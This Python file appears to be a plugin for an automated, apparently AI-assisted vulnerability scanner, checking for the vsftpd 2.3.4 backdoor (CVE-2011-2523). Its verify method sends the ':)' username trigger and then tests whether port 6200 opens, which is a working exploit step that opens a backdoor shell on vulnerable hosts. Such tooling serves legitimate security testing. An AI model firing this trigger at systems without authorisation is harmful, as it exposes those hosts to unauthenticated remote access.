import socket
import time
from typing import Dict, Any
from plugins.base_plugin import BasePlugin

class VSFTPDBackdoorPlugin(BasePlugin):
    @property
    def METADATA(self) -> Dict[str, Any]:
        return {
            "id": "CVE-2011-2523",
            "name": "vsftpd 2.3.4 Backdoor",
            "cvss_score": 9.8,
            "service": "ftp",
            "version": "2.3.4"
        }

    def match(self, service_info: Dict[str, Any]) -> bool:
        # Điều kiện kích hoạt: Tool output (Nmap) trả về ftp và version chứa 2.3.4
        service = service_info.get("service", "").lower()
        version = service_info.get("version", "")
        return service == "ftp" and "2.3.4" in version

    def verify(self, target_ip: str, target_port: int, context: Dict[str, Any]) -> Dict[str, Any]:
        # Bước 4 & 5: AI Self-validation & Confirmation condition
        try:
            # Gửi payload mặt cười để kích hoạt backdoor
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target_ip, target_port))
            s.recv(1024)
            s.send(b"USER 1234:)\n")
            s.recv(1024)
            s.send(b"PASS pass\n")
            s.close()
            
            time.sleep(1)

            # Kiểm tra xem cổng 6200 có thực sự mở không
            check_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            check_sock.settimeout(3)
            result = check_sock.connect_ex((target_ip, 6200))
            check_sock.close()

            if result == 0:
                return {"status": "CONFIRMED", "evidence": "Port 6200 successfully opened after sending trigger payload ':)'"}
            else:
                return {"status": "FALSE_POSITIVE", "evidence": "Port 6200 did not open. Likely a backported patch or blocked by firewall."}
        
        except Exception as e:
            return {"status": "PENDING", "evidence": f"Network error during verification: {str(e)}"}
